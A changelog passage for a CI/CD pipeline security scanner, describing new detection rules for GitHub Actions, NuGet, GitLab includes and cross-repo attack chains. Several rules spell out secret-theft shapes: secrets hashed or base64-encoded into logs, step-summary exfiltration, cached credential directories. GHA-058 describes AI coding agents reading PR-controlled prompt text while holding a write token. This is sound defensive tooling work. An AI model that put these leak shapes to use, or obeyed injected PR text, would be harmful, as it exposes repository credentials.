  `pipeline-check-pr` action remains available standalone but the
  top-level action is now the recommended single-step setup for SARIF
  upload + PR comments.
- **Autofix safety tiers (closes #177).** ``--fix`` (bare flag) now runs
  only safe fixers; ``--fix=unsafe`` runs all; ``--fix=unsafe-only`` runs
  only inference-dependent fixers. 109 fixers labeled safe, 2 unsafe.
  Enforced by ``tests/test_autofix_safety.py``.
- **NuGet provider (``--pipeline nuget``).** Fifth dependency-supply-chain
  provider. Parses ``*.csproj``, ``Directory.Packages.props``,
  ``packages.config``, ``NuGet.config``, and ``packages.lock.json``.
  Nine rules (NUGET-001..009) covering floating ranges, wildcard
  prereleases, missing versions, HTTP sources, compromised versions,
  missing lockfile, dependency-confusion source mapping, cooldown
  gate, and live OSV advisory lookup. Provider count 23 -> 24.
- **Live OSV advisory lookup (NPM-010, PYPI-009, MVN-009, NUGET-009).**
  Shared ``_primitives/osv_fetcher.py`` queries the OSV batch API for
  every exact name+version pair behind ``--resolve-remote``. Fires
  CRITICAL on advisory hit. Closes the freshness gap the curated
  offline registries have against newly filed advisories.
- **Inline source-line ignore comments (closes #174).** Three directives:
  ``# pipeline-check: ignore[RULE-ID]`` (same line),
  ``ignore-next-line[RULE-ID]`` (following line), and
  ``ignore-file[RULE-ID]`` (entire file). Comma-separated IDs and
  optional ``reason=<text>`` supported. Both ``#`` and ``//`` prefixes
  recognized. Flows through the same ``core/gate.py`` plumbing as
  ``--ignore-file``. Disabled via ``--no-inline-ignore``. 23 tests.
- **Direct-HCL Terraform parsing (``--tf-source``).** ``--tf-source <dir>``
  parses ``*.tf`` files via ``python-hcl2`` (behind ``[hcl]`` extra) and
  synthesizes the same ``TerraformResource`` objects the plan-JSON path
  produces, so all 58 TF-NNN rules run unchanged. Variable/local
  substitution is best-effort; unresolvable references stay opaque and
  findings get confidence-demoted. Auto-detects ``main.tf`` presence.
  Unskips the ``terragoat`` benchmark. 23 new tests.
- **Cross-repo XPC chains (CXPC-001..004, closes #173).** Four
  ``CXPC-NNN`` attack chains that fire only during fleet scans,
  composing findings across repo boundaries.
  CXPC-001: npm publish-side cooldown (NPM-008) paired with a floating
  consumer in a partner repo (NPM-001/NPM-002), HIGH, T1195.002 /
  T1078.004. CXPC-002: Argo CD wildcard ``sourceRepos`` (ARGOCD-001)
  paired with a weakened CI gate in a partner repo
  (GHA-002/TAINT-001/TAINT-002), CRITICAL, T1195.002 / T1199 /
  T1078.004. CXPC-003: unscoped App-token mint (GHA-061) paired with
  credential exposure in a partner repo (GHA-005/GHA-008), HIGH,
  T1078.004 / T1098.001. CXPC-004: tainted reusable-workflow producer
  (TAINT-001/002/003) paired with any GHA consumer finding in a
  partner repo, HIGH, T1195.002 / T1199. All four use v1 co-occurrence
  reachability at MEDIUM confidence. Chain engine gained
  ``evaluate_cross_repo(findings_by_repo)`` entry point; fleet
  orchestrator invokes CXPC evaluation after all per-repo scans
  complete. Chain count 41 -> 45.
- **Fleet phase 2: ``--from-org``, ``--jobs``, ``--scan-flags``,
  ``--include`` / ``--exclude``, multi-platform coordinates.**
  ``--from-org ORG`` enumerates repos from the SCM API with paginated
  backends for GitHub (``/orgs/{org}/repos``), GitLab
  (``/groups/{id}/projects``), and Bitbucket
  (``/repositories/{workspace}``); archived repos excluded
  automatically. ``--jobs N`` runs parallel clones and scans via
  ``ThreadPoolExecutor`` (auto-detected worker count when omitted).
  ``--scan-flags`` forward arbitrary CLI flags to each per-repo
  subprocess via ``shlex.split``. ``--include`` / ``--exclude`` glob
  filters on repo name via ``fnmatch``. Multi-platform YAML
  coordinates (``gitlab:group/sub/project``,
  ``bitbucket:workspace/slug``) now accepted. ``--platform`` selects
  the SCM backend for ``--from-org``. Still deferred:
  ``--baseline-dir`` regression diffing, per-repo SARIF, per-repo
  ``threats.md``.
- **Supply-chain posture rule pack.** Six rules informed by
  ``6mile/gimmepatz``, ``6mile/tvpo``,
  ``SecureStackCo/visualizing-software-supply-chain``, and the OSC&R
  technique catalog. GHA-097 (recursive PR auto-merge loop, OSC&R
  PER-1), GHA-098 (deploy without security scan gate, OSC&R DE-4),
  GHA-099 (deploy env plaintext secret, OSC&R CA-6), SCM-048 (org
  codespace secrets scoped to all repos), SCM-049 (classic PAT
  detection via token-prefix inspection), NPM-012 (legacy publish
  token lacking ``npm_`` granular-token restrictions). All six mapped
  to OWASP, OSC&R, and all 16 standards. Rule counts: GHA 87 -> 90,
  SCM 47 -> 49, npm 11 -> 12.
- **OSC&R standard mapping.** 16th standards mapping. OSC&R (Open
  Software Supply Chain Attack Reference, ``pbom-dev/OSCAR``) is a
  MITRE ATT&CK-style matrix for software supply chain attacks:
  12 tactics, 86 techniques. 610 checks mapped to 61 of 86
  techniques; 25 attacker-side techniques (reconnaissance, resource
  development, runtime exploitation) left unmapped with documented
  gaps. ``--standard oscr`` inherits from existing standards plumbing.
  Standards count 15 -> 16.
- **GitLab remote ``include:`` resolver (closes #164).** When
  ``--resolve-remote`` is on, the GitLab provider fetches
  ``include: { project/remote/template/component }`` directives via
  the GitLab API and merges them into the pipeline document before
  rules run. TAINT-004 (dotenv artifact flow) and TAINT-008
  (extends-chain inheritance) now see jobs and templates from remote
  includes. Four include types supported: ``project:`` (file API with
  ``PRIVATE-TOKEN``), ``remote:`` (HTTPS-only direct fetch),
  ``template:`` (templates API with JSON content extraction),
  ``component:`` (URI-parsed to project file fetch). Recursive
  resolution with depth limit and cycle detection. Disk cache at
  ``~/.cache/pipeline-check/gitlab-resolver/`` (7-day TTL, disable
  with ``--no-cache``). New CLI options: ``--gitlab-token`` (falls
  back to ``$GITLAB_TOKEN``), ``--gitlab-url`` (self-hosted instance
  support, defaults to ``https://gitlab.com``). Graceful degradation:
  fetch failures land in warnings, the rest of the scan completes.
  When ``--resolve-remote`` is off, a nudge warning lists the count
  of unresolved remote includes. 33 new tests.

### Changed

- **FN/FP quality sweep.** Five improvements to reduce false negatives
  and false positives across the check landscape:
  1. **Jenkins keyed-hex + entropy gap closed (FN fix).** JF-008 now
     extracts key-value pairs from Groovy ``environment {}`` blocks and
     runs a second pass with dict input so the keyed-hex (40-char
     lowercase hex bound to a credential-named key) and entropy
     detectors fire on Jenkins pipelines. Previously these passes were
     silently skipped because JF-008 passed a pre-collected string list.
  2. **Vendor example-key allowlist (FP fix).** New
     ``VENDOR_EXAMPLE_TOKENS`` frozenset in ``_patterns.py`` suppresses
     well-known documentation tokens (AWS ``AKIAIOSFODNN7EXAMPLE``,
     Stripe ``sk_test_`` docs keys, Twilio ``ACXX...`` / ``SKXX...``
     placeholders, SendGrid docs example). All ``*008`` rules updated.
  3. **Dep-update tooling exemptions expanded (FP fix).** 15 new tools
     added to the ``_DEP_UPDATE_TOOL_EXEMPT_RE`` allowlist: ``poetry``,
     ``pipx``, ``uv``, ``twine``, ``flit``, ``hatch``, ``black``,
     ``isort``, ``flake8``, ``pylint``, ``pytest``, ``tox``, ``nox``,
     ``pre-commit``, ``commitizen``. npm/corepack self-upgrade patterns
     also added.
  4. **GHA-004 reusable-workflow caller note (FN visibility).** When a
     workflow contains reusable-workflow callers whose permissions
     can't be verified without ``--resolve-remote``, the finding
     description now names the unverifiable jobs and points at the flag.
  5. **``--resolve-remote`` coverage delta documented.** New "What
     ``--resolve-remote`` unlocks" section in ``docs/usage.md`` with
     per-provider tables showing what checks degrade or go silent
     without the flag.
- **GHA-004 widened with top-level write-scope aggregation.** When a
  workflow-level ``permissions:`` block grants a write scope that no
  inheriting job consumes, the rule now flags the excess grant.
  Completes the overprovisioned-permissions sweep (roadmap item
  GHA-068). 8 new tests.
- **GHA-058 widened with PR-checkout topology (closes #152).**
  Adds a second detection shape inspired by zizmor proposals
  #1605 (``agentic-actions``) and #1607 (hijackable commands after
  checkout). Fires when an agentic CLI (claude / gemini / q /
  cursor-agent / aider / openhands / goose) runs in a step *after*
  a step that checked out a PR head (``actions/checkout`` with
  ``ref:`` resolving to ``github.event.pull_request.head.*``,
  ``github.head_ref``, or a ``refs/pull/*/head`` literal) AND a
  write-scope token is in scope for the job (job-level
  ``permissions: write-all``, any token granted ``write``,
  ``id-token: write``, or no permissions block declared, since the
  runtime default carries ``contents: write``). The flag itself is
  not required, the topology IS the bug: an agent reading PR-
  controlled prompt text from the checked-out tree gets the
  runner's token as a side effect. Pairs with GHA-045 (caller-
  controlled ref) and GHA-046 (manual PR-head fetch). 9 new tests
  under ``TestGHA058PRCheckoutTopology``.

### Fixed

- **TAINT-009 substring false positive.** The consumer-job reference
  check used substring ``in`` to match ``needs.X.outputs.token``,
  which also matched ``needs.X.outputs.tokenized``. Replaced with
  regex + negative lookahead for exact output-name boundaries.
- **Vendor example-key false positives.** New
  ``VENDOR_EXAMPLE_TOKENS`` allowlist suppresses well-known
  documentation tokens (AWS ``AKIAIOSFODNN7EXAMPLE``, Stripe
  ``sk_test_`` docs keys, Twilio/SendGrid docs examples) across all
  ``*008`` literal-secret rules.
- **Stale standards count across 7 doc surfaces.** The OSC&R standard
  (16th) shipped in post-1.4.0 but ``action.yml``, ``pyproject.toml``,
  ``mkdocs.yml``, ``CONTRIBUTING.md``, ``.github/DOCKERHUB.md``,
  ``docs/index.md`` hero text, and the ``gen_standards_docs.py`` OWASP
  intro still said 14 or 15. All bumped to 16 (or "15 other" where
  OWASP is counted separately).
- **Stale chain count in ``docs/index.md``.** The feature prose said
  "38 multi-finding chains" but the registry has 45.
  ``test_doc_claims.py``'s chain-claim regex now also matches
  "multi-finding chains" (not just "attack chains") so this class
  of drift is guarded going forward.

### Added

- **GHA-096 known-vulnerable action ref via GHSA feed.** New rule
  that queries the GitHub Advisory Database
  (``GET /advisories?type=reviewed&ecosystem=actions``) for each
  action referenced by the loaded workflows. Gated on
  ``--resolve-remote``; the offline default stays no-network.
  Version matching: when the ``uses:`` ref looks like a tag with a
  parseable version (``v4.2.0``, ``4.2``), the rule checks each
  advisory's ``vulnerable_version_range`` and only fires on a
  match. SHA-pinned or major-tag refs fire at MEDIUM confidence
  with a note that the version could not be verified. Widens
  GHA-040 (curated compromised-SHA list) from static incidents to
  the full CVE-tracked advisory corpus. HIGH severity, OWASP
  CICD-SEC-3 / CICD-SEC-8, ESF-S-VERIFY-DEPS / ESF-S-PIN-DEPS,
  CWE-1395 / CWE-829. 12 per-rule tests, 6 fetcher tests, and
  20 version-range primitive tests. Brings GHA pack to 87 rules.

- **GHA-095 ref-version-mismatch: SHA pin vs `# vX.Y.Z` comment
  (closes #146).** New rule that fires when an action's SHA pin
  doesn't resolve to the tag named in the adjacent
  ``# vX.Y.Z`` comment. Drift between the SHA and the comment is
  the canonical impostor-commit setup, the SHA fetches something,
  the comment lies about what. A reviewer skimming the diff
  anchors on the comment and trusts the SHA without re-querying
  the network. Two new mechanisms feed the check:
  ``Workflow.raw_text`` captures the on-disk text (PyYAML drops
  comments during parsing) so the rule can locate
  ``uses: o/r@<sha>  # <ver>`` lines; a new
  ``ActionMetadataFetcher.fetch_tag_shas`` resolves each
  comment-mentioned tag via ``/commits/{tag}`` and folds the
  result into ``ActionRepoMetadata.tag_shas``. ``v``-prefix swaps
  (``v4`` vs ``4``) are tried both ways before a tag is treated
  as unresolvable; unresolvable tags pass silently so a comment
  naming an internal alias doesn't false-fire. Network-dependent
  (gated on ``--resolve-remote``); without the flag the rule
  passes silently with a one-line nudge. HIGH severity. Pairs
  with GHA-040 (compromised SHA / tag), GHA-090 (impostor-commit,
  the cross-network sibling), and GHA-001 (unpinned ``uses:``).
  OWASP CICD-SEC-3 / CICD-SEC-8, ESF-S-VERIFY-DEPS, CWE-1357 /
  CWE-829 / CWE-345. 13 per-rule tests, 11 parser tests, and 6
  fetcher tests under ``tests/github/test_action_reputation.py``.
  Brings GHA pack to 86 rules.

- **GHA-094 stale-action-refs: SHA = branch tip (closes #151).**
  New rule that fires when a SHA-pinned ``uses:`` matches the
  current tip of any branch in the upstream repo. A maintainer
  who can push to a branch can re-point the HEAD; your pin stays
  on the old commit but anyone re-pinning to "latest" picks up
  unaudited code. Reads a new ``branch_head_shas`` field on
  ``ActionRepoMetadata``, populated by a one-shot
  ``GET /repos/{o}/{r}/branches?per_page=100`` only when at least
  one SHA-shaped ``uses:`` references the action. Case-insensitive
  matching against the lower-cased snapshot. Tag-pinned refs are
  out of scope. Pairs with GHA-047 (fresh referenced ref) and
  GHA-090 (impostor-commit, the cross-network sibling). MEDIUM
  severity, OWASP CICD-SEC-3, ESF-S-VERIFY-DEPS, NIST SR-3 /
  SR-11, CSF GV.SC-05, SOC 2 CC6.8 / CC8.1, PCI 6.3.3, CIS 1.4.1 /
  3.1.5, OpenSSF Scorecard Pinned-Dependencies, SLSA Build.L3.
  NonFalsifiable. 9 per-rule tests + 4 fetcher tests under
  ``tests/github/test_action_reputation.py``. Brings GHA pack to
  85 rules.

- **GHA-093 Living-off-the-Pipeline indicators (closes #156).**
  Inspired by zizmor proposal #1948 (LOTP). Three independent
  failure shapes in one rule, any one fires:
    1. **STEP_SUMMARY exfil.** A ``run:`` line that combines a
       secret reference (``${{ secrets.* }}`` context or a
       ``$NAME`` expansion of a step ``env:`` value bound to
       ``secrets.*``) with a redirect to ``$GITHUB_STEP_SUMMARY``.
       Disjoint from GHA-087, which fires on transform-then-sink;
       this one covers the no-transform shape.
    2. **Workflow-command log injection.** A ``::warning::`` /
       ``::notice::`` / ``::error::`` directive whose message
       interpolates an attacker-controlled context (PR title /
       body / labels / branch name, head_ref, etc.).
    3. **``::add-mask::`` after print.** Within the same ``run:``
       block, an earlier print of a variable (``echo $X``) and a
       later ``::add-mask::$X`` directive: the masker registers
       too late, the earlier echo already shipped to the log
       unmasked.
  HIGH severity, OWASP CICD-SEC-10 / CICD-SEC-6,
  ESF-D-SECRETS / ESF-D-INJECTION. 15 per-rule tests under
  ``tests/github/test_gha093.py`` plus a per-check fixture pair.
  Brings GHA pack to 84 rules.

- **GHA-092 TOCTOU PR head SHA (closes #154).** Inspired by zizmor
  proposal #935. Within a single job, fires when a step captures
  the PR head SHA (a ``run:`` body or ``env:`` block interpolating
  ``github.event.pull_request.head.sha``, or a ``run:`` containing
  ``git rev-parse HEAD`` after an earlier checkout) AND a later
  step runs ``actions/checkout`` with ``ref:`` containing the same
  PR head SHA expression. A contributor force-push between the two
  reads lets unreviewed code land with the gate's stamp of
  approval. ``pull_request_target.head.sha`` variant covered. The
  safe shape (capture once, reuse the captured value for both
  gate and checkout) stays silent. Pairs with GHA-045 (caller-
  controlled ref) and GHA-046 (manual PR-head fetch). HIGH
  severity, OWASP CICD-SEC-1 / CICD-SEC-7, ESF-D-CODE-REVIEW,
  CWE-367 / CWE-362. 12 per-rule tests under
  ``tests/github/test_gha092.py`` plus a per-check fixture pair.
  Brings GHA pack to 83 rules.

- **GHA-091 repojacking (closes #155).** New rule that fires when
  an action's upstream repo is missing — the namespace is
  takeover-eligible by anyone. Reads a new
  ``ctx.action_fetch_failures`` set (lower-cased ``owner/repo``
  slugs whose ``GET /repos/{o}/{r}`` came back empty during the
  ``--resolve-remote`` pass). Same per-action repo fetch the
  GHA-041..043 reputation rules ride on; no new HTTP call. Both
  step-level and reusable-workflow ``uses:`` are covered. Apply
  the same unanimous-failure heuristic as GHA-090: if every
  referenced action's fetch failed and at least two were probed,
  treat as rate-limit / resolver noise. HIGH severity, OWASP CICD-
  SEC-3 / CICD-SEC-8, ESF-S-VERIFY-DEPS, NIST SR-3 / RA-5, CSF
  GV.SC-05, SOC2 CC6.8 / CC8.1, PCI 6.3.1 / 6.3.3, CIS 1.4.1 /
  3.1.3, OpenSSF Scorecard Pinned-Dependencies, SLSA Build.L3.
  NonFalsifiable. 9 per-rule tests under
  ``tests/github/test_action_reputation.py::TestGHA091``. Brings
  GHA pack to 82 rules.

- **GHA-090 impostor-commit (closes #147).** New rule that fires
  when a SHA-pinned ``uses:`` reference points at a commit absent
  from the claimed repo's commit graph (the "fork-network only"
  attack shape). Reads a new ``sha_membership`` field on
  ``ctx.action_metadata[owner/repo]``, populated by an additional
  per-SHA ``GET /repos/{o}/{r}/commits/{sha}`` probe in the same
  ``--resolve-remote`` metadata pass. The probe runs only on
  refs that look like 40-char SHAs (tag / branch refs are out of
  scope for this attack model). Unanimous-failure shape (every
  probed SHA returns False) is treated as rate-limit / resolver
  noise rather than impostor-commit and the rule passes silently
  with a one-line nudge. Both step-level and reusable-workflow
  SHA pins covered, duplicate SHAs de-duped. HIGH severity, OWASP
  CICD-SEC-3 / CICD-SEC-8 / ESF-S-VERIFY-DEPS / NIST SR-3 / NIST
  CSF GV.SC-05 / SOC2 CC6.8 / PCI 6.3.1. 8 per-rule tests + 4
  fetcher-level tests under
  ``tests/github/test_action_reputation.py``. Brings GHA pack to
  81 rules.

- **GHA-089 archived ``uses:`` (closes #149).** New rule that
  fires when an action's upstream repo is archived. Reads the
  ``archived`` bit already populated on
  ``ctx.action_metadata[owner/repo]`` by ``--resolve-remote``, so
  no new HTTP call lands; piggybacks on the same per-action repo
  fetch the GHA-041..043 reputation rules consume. Passes
  silently when the resolver is off, mirroring GHA-041's discover-
  the-flag posture. Both step-level ``uses:`` and job-level
  reusable-workflow ``uses:`` are covered, case-insensitive
  metadata lookup. MEDIUM severity, OWASP CICD-SEC-3 /
  ESF-S-VERIFY-DEPS / CIS 1.4.1 / NIST SR-3 / NIST CSF GV.SC-05.
  8 per-rule tests under
  ``tests/github/test_action_reputation.py::TestGHA089``. Brings
  GHA pack to 80 rules.

- **GHA-088 typosquat ``uses:`` (closes #148).** Offline edit-
  distance check against a curated top-actions list. Fires on
  one- or two-character edits to a canonical action slug,
  ``actions/check0ut`` (digit zero), ``actons/checkout`` (missing
  ``i``), ``actions/cehckout`` (transposition), ``actions/checkouts``
  (trailing ``s``). Both step-level ``uses:`` and job-level
  reusable-workflow ``uses:`` are covered, exact matches stay
  silent, and Damerau-Levenshtein counts adjacent transposition as
  one edit. The list lives at
  ``pipeline_check.core.checks._primitives.top_actions`` and is
  refreshable by PR. HIGH severity, OWASP CICD-SEC-3, ESF-S-VERIFY-
  DEPS. 14 per-rule tests under ``tests/github/test_gha088.py``
  plus 13 primitive-level tests under
  ``TestTopActionsFindTyposquat``. Brings GHA pack to 79 rules
  (provider count unchanged at 23).

## [1.4.0] - 2026-05-22

### Added

- **Zizmor parity sweep: small-widening batch (closes #157, #158,
  #159).** Three companion changes that complete the existing-
  rule-widening portion of the Zizmor parity sweep:
    * **GHA-003 widened to `services.*.options` and
      `services.*.env` (closes #157).** Mirrors zizmor proposal
      #1128. Both YAML paths reach `docker create` argv (the
      service container's options + env); direct
      `${{ untrusted_context }}` interpolation on either is a
      shell-injection sink. Indirect taint via workflow env
      doesn't apply (the runner doesn't expand `$NAME` in those
      positions). 3 new tests under `TestGHA003ScriptInjection`.
    * **GHA-050 widened to "attestation explicitly disabled"
      (closes #158).** Mirrors zizmor proposal #938. Fires when
      `pypa/gh-action-pypi-publish` sets `attestations: false`,
      OR `docker/build-push-action` with `push: true` sets any
      of `provenance: false` / `sbom: false` /
      `attestations: false` while staying under the long-lived-
      secret check's radar. Environment carve-out still applies.
      7 new tests under
      `TestGHA050AttestationExplicitlyDisabled`.
    * **CLI flag `--only-known-attacked` (closes #159).** Mirrors
      zizmor proposal #1135. New flag filters the rule set to
      rules whose `Rule.incident_refs` is non-empty (77 rules
      today). Composes with `--checks`: if both are set, the
      intersection runs. Empty-intersection case emits a stderr
      warning rather than silently producing no findings. Caches
      the rule-discovery walk so repeated invocations don't
      re-iterate the package tree. 3 new tests under
      `tests/test_cli.py`.
- **GHA-004 widened: overprovisioned permissions detection
  (zizmor parity, closes #150).** GHA-004 already flagged
  "missing permissions block", `write-all`, `contents: write` on
  PR triggers, and `id-token: write` without an OIDC step. The
  rule now also flags any other write scope granted on a job
  where no step justifies it.
  - Per-scope consumer catalogs for `contents`, `pull-requests`,
    `packages`, `issues`, `security-events`, `pages`, `checks`,
    `deployments`, `statuses`, `actions`.
  - Wildcard consumer: `actions/github-script` matches every
    scope (it can mutate any scope through octokit).
  - Special case: `docker/build-push-action` with `push: true`
    counts as a `packages: write` consumer.
  - Reusable-workflow callers (`jobs.<id>.uses:`) stay silent;
    grants forward to the callee.
  - Unknown scopes (`attestations`, `discussions`, `models`,
    `repository-projects`) stay silent rather than guess at
    consumers; documented as a known FP carve-out.
  - Rule title bumped to "Workflow permissions block missing or
    overprovisioned" to reflect both shapes.
  - 22 new per-shape tests under
    `tests/github/test_gha004_overprovisioned.py`; 7 existing
    GHA-004 tests still pass unchanged.
- **Zizmor parity sweep: fourth batch (GHA-072 / GHA-073 plus a
  GHA-053 widening).** Two more offline-only rules plus a small
  expansion of the existing untrusted-context list:
    * **GHA-072: secret in env: at a wider scope than its
      consumer.** HIGH severity. Fires when a job-level
      ``env:`` entry binds ``${{ secrets.* }}`` and at most one
      step in that job references the named variable, OR when a
      workflow-level ``env:`` binds a secret and at most one job
      consumes it. Step-level ``env:`` is the safe default. The
      rule's consumer scan checks ``run:`` bodies, ``with:``
      values, and ``env:`` re-bindings, with word-bounded
      matching so ``$TOKEN_PATH`` doesn't masquerade as ``TOKEN``.
      Mirrors zizmor ``overprovisioned-secrets``.
    * **GHA-073: reusable workflow declares an unused
      ``workflow_call`` secret.** MEDIUM severity. Fires when an
      ``on.workflow_call.secrets.<name>`` declaration is never
      referenced via ``${{ secrets.<name> }}`` anywhere in the
      workflow body. Every caller is forced to forward a value
      the body never reads; the secret namespace bloats with
      stale declarations across refactors. Mirrors zizmor
      proposal #1044.
    * **GHA-053 widening (zizmor proposal #635).** Five new
      attacker-controllable PR-metadata contexts join
      ``_UNTRUSTED_CONTEXTS`` so ``if:`` predicates gating on
      them get flagged: ``github.event.pull_request.labels``,
      ``.milestone.title`` / ``.milestone.description``,
      ``.requested_reviewers``, ``.assignees``. The canonical
      ``contains(github.event.pull_request.labels.*.name,
      'safe-to-test')`` foot-gun now fires GHA-053 (existing
      rule, no new ID).
  17 per-rule tests + standard safe/unsafe fixture pairs.
  Standards mappings landed for OWASP / ESF / CIS / NIST 800-53 /
  NIST CSF / NIST SSDF / SOC2 / PCI-DSS v4. Github provider
  check count 76 -> 78.
- **Zizmor parity sweep: third batch (GHA-069 / GHA-070 / GHA-071).**
  Three more offline-only rules:
    * **GHA-069: ``id-token: write`` granted without an OIDC-
      consumer step.** MEDIUM severity. Fires when a job
      effectively holds ``id-token: write`` (job-level or
      inherited from the workflow, plus ``permissions: write-
      all``) but no step invokes a known OIDC consumer:
      ``aws-actions/configure-aws-credentials``, ``azure/login``,
      ``google-github-actions/auth``, ``pypa/gh-action-pypi-
      publish``, the Sigstore signing pack
      (``sigstore/cosign-installer`` and friends, the
      ``slsa-framework/slsa-github-generator`` reusable),
      ``actions/attest-build-provenance`` / ``actions/attest-
      sbom``, or ``docker/build-push-action`` with
      ``provenance:`` / ``sbom:`` / ``attestations:`` set to a
      truthy value. Mirrors zizmor proposal #1968.
    * **GHA-070: ``ssh-keyscan`` / disabled host-key check trust-
      on-first-use.** HIGH severity. Fires on any ``run:`` body
      containing ``ssh-keyscan ... >> known_hosts``,
      ``-o StrictHostKeyChecking=no``, ``-o
      StrictHostKeyChecking=accept-new``, or
      ``-o UserKnownHostsFile=/dev/null`` on ``ssh`` / ``scp`` /
      ``rsync``. The runner's upstream network can MITM every
      subsequent SSH connection from the same job. Mirrors
      zizmor proposal #2012.
    * **GHA-071: ``shell: pwsh`` / ``powershell`` on a Linux /
      macOS step.** LOW (advisory) severity. Fires when a
      ``run:`` step's effective shell (step override > job
      defaults > workflow defaults) is ``pwsh`` or
      ``powershell`` and the job's ``runs-on:`` is a Linux or
      macOS image. Cross-shell language drift is a low-impact
      source of escaping bugs (an injection that's a no-op in
      bash can be live in pwsh and vice versa). Self-hosted
      label lists stay silent (OS unidentifiable from labels
      alone). Mirrors zizmor proposal #288.
  29 per-rule tests + standard safe/unsafe fixture pairs.
  Standards mappings landed for OWASP / ESF / CIS / NIST 800-53 /
  NIST CSF / NIST SSDF / SOC2 / PCI-DSS v4. Github provider
  check count 73 -> 76.
- **Zizmor parity sweep: second batch (GHA-066 / GHA-067 / GHA-068).**
  Three more offline-only rules:
    * **GHA-066: ``actions/upload-artifact`` path is a workspace
      wildcard.** HIGH severity. Fires when an upload-artifact
      step's ``with.path:`` is ``**/*`` / ``.`` / ``./`` / ``/`` /
      ``${{ github.workspace }}`` / ``${{ github.workspace }}/**``
      (single value, list, or multi-line YAML scalar block).
      ArtiPACKED-class credential leakage: the archive sweeps
      ``.git/config`` (token-bearing after checkout) and any
      ``node_modules`` / ``vendor`` content. Mirrors zizmor
      proposal #195.
    * **GHA-067: ``actions/cache`` writes credential-shaped
      paths.** HIGH severity. Fires when an ``actions/cache``
      step's ``path:`` covers ``~`` (any spelling: quoted, ``~/``,
      ``$HOME``, ``${HOME}``), ``~/.docker``, ``~/.aws``,
      ``~/.azure``, ``~/.gcloud``, ``~/.kube``, ``~/.ssh``,
      ``~/.gnupg``, ``~/.npmrc``, ``~/.netrc``,
      ``~/.gradle/gradle.properties``, or ``~/.m2/settings.xml``.
      The cache namespace is shared across PR builds; any
      contributor's run can request a cache hit on the same key
      and restore the cached credential. Mirrors zizmor proposal
      #723.
    * **GHA-068: ``runs-on:`` targets an end-of-life hosted-runner
      image.** MEDIUM severity. Fires on retired or imminently-
      retired images: ``ubuntu-18.04`` (retired 2023-04-01),
      ``ubuntu-20.04`` (retiring 2025-04-15), ``macos-10.15`` /
      ``macos-11`` / ``macos-12``, ``windows-2016`` /
      ``windows-2019``. Handles string, list, and ``group:`` /
      ``labels:`` dict shapes for ``runs-on:``. Self-hosted-style
      label lists are skipped (GHA-012's territory). Mirrors
      zizmor proposal #260 / #827.
  32 per-rule tests + standard safe/unsafe fixture pairs.
  Standards mappings landed for OWASP / ESF / CIS / NIST 800-53 /
  NIST CSF / NIST SSDF / SOC2 / PCI-DSS v4. Github provider check
  count 70 -> 73.
- **Zizmor parity sweep: first batch (GHA-063 / GHA-064 / GHA-065).**
  Three offline-only rules drawn from zizmor's audit pack:
    * **GHA-063: ``if:`` predicate gates on a spoofable bot-actor
      comparison.** HIGH severity. Fires when a job-level or step-
      level ``if:`` compares ``github.actor`` /
      ``github.triggering_actor`` / ``github.event.sender.login``
      to a literal ``*[bot]`` string (equality or inequality), or
      invokes ``contains(github.actor, 'bot')`` /
      ``endsWith(github.actor, '[bot]')`` / swap-argument
      variants. A maintainer who re-runs the workflow can set
      those fields to any login, so the predicate is not a trust
      gate. Carve-out: paired ``github.event.*.user.type == 'Bot'``
      check on the same expression stays silent (account type is
      set by GitHub and can't be spoofed by a re-run). Mirrors
      zizmor v1.25.2 ``bot-conditions``.
    * **GHA-064: ``contains()`` invoked with comma-delimited string
      operand.** HIGH severity. Fires when an ``if:`` expression
      invokes ``contains('<haystack-with-comma>', <expr>)`` (or
      double-quoted variant). The author wrote what looks like a
      list literal; ``contains()`` on a string is a substring
      match, so ``mai`` and any branch whose name embeds the
      literal pass the gate. ``fromJSON('["main", ...]')`` is the
      canonical fix and stays silent. No-comma substring searches
      (``contains('refs/heads/release', github.ref)``) are not
      flagged. Mirrors zizmor v1.25.2 ``unsound-contains``.
    * **GHA-065: workflow body contains zero-width or bidi
      Unicode characters.** CRITICAL severity. Walks every string
      value in the parsed workflow document for any of 15
      suspicious codepoints (``U+200B``-``U+200F`` zero-width and
      bidi marks, ``U+202A``-``U+202E`` LRE / RLE / PDF / LRO /
      RLO, ``U+2066``-``U+2069`` LRI / RLI / FSI / PDI, ``U+FEFF``
      BOM). Any single occurrence fires. The Trojan-Source class
      (Boucher & Anderson, 2021): a diff viewer renders one
      expression while the YAML parser sees another, the
      characters carry no syntactic meaning in CI workflows and
      have no legitimate use case. Mirrors zizmor proposal #914.
  All three rules are pure-offline (no curated registry / no
  network), bundled as the first Zizmor sweep batch. 27 per-rule
  tests under ``tests/github/test_gha063.py`` /
  ``test_gha064.py`` / ``test_gha065.py`` plus standard
  safe/unsafe fixture pairs. Standards mappings landed for
  OWASP / ESF / CIS / NIST 800-53 / NIST CSF / SOC2 / PCI-DSS
  v4. Github provider check count 67 -> 70; total check-claim
  floor 820+ -> 840+.
- **GHA-087: derived value of a secret printed to the build log.**
  New github-provider rule, HIGH severity. Fires on a single
  ``run:`` line that combines: (1) a secret reference, either a
  ``${{ secrets.* }}`` context or a ``$NAME``/``${NAME}`` expansion
  of a step ``env:`` value bound to ``secrets.*``; (2) a transform
  applied to that reference, either a fingerprint
  (``sha256sum`` / ``sha1sum`` / ``md5sum`` / ``shasum`` /
  ``openssl dgst``), an encoding (``base64`` / ``base32``), a
  bash parameter-expansion slice (``${VAR:0:N}`` / ``${VAR::N}``
  / ``${VAR:N:M}``), or a command-line truncation (``cut -c<n>`` /
  ``head -c<n>``); (3) a print sink on the same line (``echo`` /
  ``printf`` / ``tee`` at the head, or a redirect to
  ``$GITHUB_OUTPUT`` / ``$GITHUB_STEP_SUMMARY`` / a file). Catches
  cicd-goat scenario 27's derived-value half (the SHA-256 /
  base64 / first-eight-chars shapes that slip past GitHub's
  exact-match secret masker). Pairs with GHA-033 (which covers
  ``set -x`` shell-trace leaks and direct
  ``echo ${{ secrets.X }}`` shapes); the two rules are
  deliberately disjoint so a step that hits both shapes fires
  both findings. GHA-033's recommendation was tightened in the
  same cycle to drop the "log a fingerprint" suggestion that
  GHA-087 now flags. 15 per-rule tests under
  ``tests/github/test_gha087.py`` plus the standard safe/unsafe
  fixture pair (boolean ``[ -n "$X" ] && echo set || echo unset``
  is the canonical safe form). OWASP CICD-SEC-10 / CICD-SEC-6;
  ESF-D-SECRETS; CIS 2.3.7; NIST 800-53 IA-5 / AU-9; NIST CSF
